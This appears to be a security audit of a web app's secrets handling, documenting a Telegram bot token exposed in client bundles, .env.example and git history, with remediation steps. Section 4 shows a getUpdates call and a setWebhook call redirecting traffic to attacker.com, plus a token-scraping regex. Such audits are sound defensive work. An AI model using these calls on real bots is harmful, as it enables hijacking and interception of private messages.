# Secrets Management & Exposure Assessment — Software Solutions BD

This document evaluates the discovery, handling, storage, distribution, and exposure risks of sensitive credentials and configuration data across the **Software Solutions BD** codebase.

---

## 1. Where Secrets Are Expected vs Where They Actually Reside

In standard production web applications, administrative API keys, bot tokens, and database credentials belong exclusively in **isolated server-side environments** (e.g., AWS Secrets Manager, Vercel Server Environment Variables, HashiCorp Vault) and are never transmitted to client browsers.

### State of Secrets in Software Solutions BD:

| Credential Type | Purpose | Expected Storage Location | Actual Storage Location in Project | Status |
| :--- | :--- | :--- | :--- | :--- |
| **Telegram Bot Token** | Full programmatic control over `@Notification_SolutionsBD_bot` | Server-side environment variable inaccessible to browsers | 1. `.env`<br>2. `.env.example`<br>3. `src/services/telegramService.js` (fallback)<br>4. Compiled static JS (`dist/assets/*.js`) | **Exposed in Client Artifacts** |
| **Telegram Admin Chat ID** | Destination chat ID for order notifications | Server-side environment variable | 1. `.env`<br>2. `.env.example`<br>3. `src/services/telegramService.js` (fallback)<br>4. Client `localStorage`<br>5. Compiled static JS | **Exposed to Client** |
| **Meta (Facebook) Pixel ID** | Website dataset identifier for conversion tracking | Client-safe public config | `.env` (`VITE_FB_PIXEL_ID` — currently empty string) | **Non-Secret Public ID** |

---

## 2. Environment & Configuration Handling

### 2.1. Vite Build-Time Variable Inlining (`VITE_*`)
The project utilizes [Vite](https://vitejs.dev/guide/env-and-mode.html) as its build tool and bundler. Under Vite's design:
* Any environment variable prefixed with `VITE_` (e.g. `VITE_TELEGRAM_BOT_TOKEN`) is **statically inlined during `npm run build`** into the generated JavaScript chunks via search-and-replace of `import.meta.env.VITE_*`.
* **Evidence in Code**:
  [`src/services/telegramService.js`](file:///c:/Users/irfan/Desktop/SSolutions/src/services/telegramService.js#L3):
  ```javascript
  export const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "[REDACTED_FALLBACK_TOKEN]";
  ```
* **Evidence in Compiled Output**:
  [`dist/assets/index-eba7ZkNy.js`](file:///c:/Users/irfan/Desktop/SSolutions/dist/assets/index-eba7ZkNy.js):
  ```javascript
  const br="[REDACTED_TELEGRAM_BOT_TOKEN]",Ud=()=>"[REDACTED_CHAT_ID]"
  ```
* **Risk**: Prefixing a server-side secret with `VITE_` guarantees that the secret is shipped in plaintext to every user visiting the website.

### 2.2. Configuration Files (`.env` and `.env.example`)
* **`.env`**:
  * Located in workspace root: [`c:\Users\irfan\Desktop\SSolutions\.env`](file:///c:/Users/irfan/Desktop/SSolutions/.env).
  * Excluded from Git via `.gitignore` (lines 17–21).
  * Contains production `VITE_TELEGRAM_BOT_TOKEN` and `VITE_TELEGRAM_CHAT_ID`.
* **`.env.example`**:
  * Located in workspace root: [`c:\Users\irfan\Desktop\SSolutions\.env.example`](file:///c:/Users/irfan/Desktop/SSolutions/.env.example).
  * **Tracked in Git** (`git ls-files .env.example` returns `.env.example`).
  * **Critical Evidence**: Line 3 of `.env.example` contains the **active production bot token**, and Line 6 contains the **active production chat ID** instead of dummy placeholder strings (`your_bot_token_here`).

---

## 3. Hardcoded Secret Risks

In [`src/services/telegramService.js`](file:///c:/Users/irfan/Desktop/SSolutions/src/services/telegramService.js#L3-L8), default fallback values are defined:
```javascript
export const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "[REDACTED_TELEGRAM_BOT_TOKEN]";

export const getAdminChatId = () => {
  return import.meta.env.VITE_TELEGRAM_CHAT_ID || "[REDACTED_CHAT_ID]" || localStorage.getItem('softwaresolutions_telegram_chat_id') || "";
};
```
* **Risk**: If the `.env` file is missing in an environment (such as on a staging server or developer machine), the application falls back directly to the embedded production bot token string. Even if the environment variable were cleared, the fallback string would keep the credential exposed.

---

## 4. Client-Side Exposure Risks

Because the application is a pure client-side SPA with no server backend:
1. **Developer Tools Access**:
   Any visitor can press `F12` in Google Chrome, Edge, or Firefox, navigate to the **Sources** or **Network** tab, search for `api.telegram.org` or `bot`, and view the complete Telegram Bot Token.
2. **Automated Scraping**:
   Automated crawlers scanning public websites for regex patterns matching `[0-9]{9,10}:[a-zA-Z0-9_-]{35}` (standard Telegram bot token pattern) can extract the token within seconds of deployment.
3. **Implications of Telegram Bot Token Exposure**:
   * **Full Bot Control**: With this token, an external entity can issue any Telegram Bot API command directly using `curl` or Postman.
   * **Reading Private Updates**: Invoking `https://api.telegram.org/bot<TOKEN>/getUpdates` returns incoming messages, customer callbacks, and administrative responses.
   * **Phishing & Brand Damage**: The attacker can send messages to the administrator or any chat where the bot is added, impersonating Software Solutions BD.
   * **Webhook Hijacking**: Calling `https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://attacker.com/webhook` redirects all future notification traffic to the attacker.

---

## 5. Git & History Exposure Risks

### 5.1. Tracked Files with Secrets
* `.env.example` currently has the active bot token and chat ID staged in the working tree. Pushing this change to a public GitHub repository would immediately alert automated secret scanning engines (e.g., GitGuardian, GitHub Secret Scanning).

### 5.2. Historic Commits
Inspection of the local Git repository history reveals that previous bot credentials were previously checked into source control:
* **Evidence**: Commit `d0acce7` (`security: remove hardcoded telegram token and chat id from source code`) removed hardcoded token `8715...` and chat ID `8519...` from `src/services/telegramService.js`.
* **Risk**: Even when a secret is removed in a subsequent commit, **it remains in Git history permanently** across all commit objects and packfiles unless purged using tools like `git-filter-repo` or BFG Repo-Cleaner.

---

## 6. Logging & Error Exposure Risks

1. **Browser Console Warnings & Dumps**:
   * In [`src/services/telegramService.js`](file:///c:/Users/irfan/Desktop/SSolutions/src/services/telegramService.js#L163), failed API calls log the full response:
     ```javascript
     console.warn("Telegram sendMessage error:", result);
     ```
   * In [`src/services/pixelService.js`](file:///c:/Users/irfan/Desktop/SSolutions/src/services/pixelService.js#L48):
     ```javascript
     console.log(`%c[Tracking Event Fired] %c${eventName}`, ..., params);
     ```
   * When an error occurs (such as invalid chat ID, chat migration, or API network failure), the internal API structure and response metadata are dumped into the browser console where local or shoulder-surfing observers can read it.
2. **Telegram Message Logging**:
   * Order details sent via `sendMessage` include customer phone numbers and email addresses in clear text. These remain permanently stored in the Telegram cloud server chat log unless manually cleared.

---

## 7. Secret Rotation Requirements & Action Plan

Because the Telegram Bot Token has been committed to repository history and built into client assets, **it must be considered compromised and rotated immediately**.

### Step 1: Revoke Compromised Bot Token
1. Open the Telegram app and message `@BotFather`.
2. Send `/mybots` and select `@Notification_SolutionsBD_bot`.
3. Select **API Token** → **Revoke current token**.
4. BotFather will immediately invalidate the old token and generate a new token.

### Step 2: Transition to a Secure Backend Proxy (Required Architecture)
1. **Never** put the new bot token into `VITE_TELEGRAM_BOT_TOKEN` or any client-accessible variable.
2. Create a lightweight serverless backend route (e.g. Vercel Serverless Function `/api/order` or Express microservice).
3. Store the new token in a server-side environment variable named `TELEGRAM_BOT_TOKEN` (without the `VITE_` prefix).
4. The client browser submits order details to `/api/order` via HTTPS POST; the serverless function verifies inputs, applies rate limits, and invokes Telegram's API on the server side.

### Step 3: Sanitize `.env.example`
Replace real credentials in [`.env.example`](file:///c:/Users/irfan/Desktop/SSolutions/.env.example) with placeholder text:
```bash
VITE_TELEGRAM_BOT_TOKEN=your_bot_token_here
VITE_TELEGRAM_CHAT_ID=your_chat_id_here
VITE_FB_PIXEL_ID=
```

### Step 4: Purge Secrets from Git History
Run `git-filter-repo` to scrub historical tokens from all commits and force-push the sanitized tree:
```bash
git filter-repo --replace-text <(echo "regex:[0-9]{9,10}:[a-zA-Z0-9_-]{35}==>[REDACTED]")
```

---

## 8. Actual Findings & Evidence Summary

| Finding ID | Severity | Evidence | Risk | Affected Location | Why It Matters | Recommended Fix |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **SEC-SEC-01** | **Critical** (Confirmed Vulnerability) | `dist/assets/*.js` contains `const br="[REDACTED_TOKEN]"` | Public exposure of Telegram Bot administrative credential | `dist/assets/index-*.js`, `src/services/telegramService.js` (line 3) | Anyone visiting the site can hijack the bot, view updates, and send unauthorized messages | Remove `VITE_` prefix, move all Telegram API calls to a secure backend function |
| **SEC-SEC-02** | **Critical** (Confirmed Vulnerability) | `.env.example` line 3 contains active bot token; line 6 contains active chat ID | Accidental leak to public git remotes | `.env.example` lines 3 & 6 | Anyone who clones the repository gets direct administrative access to the bot | Replace values in `.env.example` with dummy placeholders |
| **SEC-SEC-03** | **High** (Security Weakness) | `src/services/telegramService.js` line 3 & line 7 specify fallback strings | Secret embedded in fallback logic | `src/services/telegramService.js` lines 3, 7 | Default fallback compromises token if env variable is unset | Remove hardcoded strings; fail gracefully if server credentials are not found |
| **SEC-SEC-04** | **High** (Security Weakness) | Commit `d0acce7` contains previously hardcoded tokens in git object database | Secret discovery through commit history | Git history (`git log -p`) | Revoked/old credentials in history can be replayed or analyzed for patterns | Rewrite git history with `git-filter-repo` and confirm token revocation with BotFather |
| **SEC-SEC-05** | **Medium** (Missing Control) | No server-side secret store or key vault integration | Relying solely on local plaintext `.env` files | Root directory `.env` | Plaintext files on developer machines are vulnerable to malware or accidental staging | Implement cloud secret management (e.g. Vercel Project Environment Variables) |

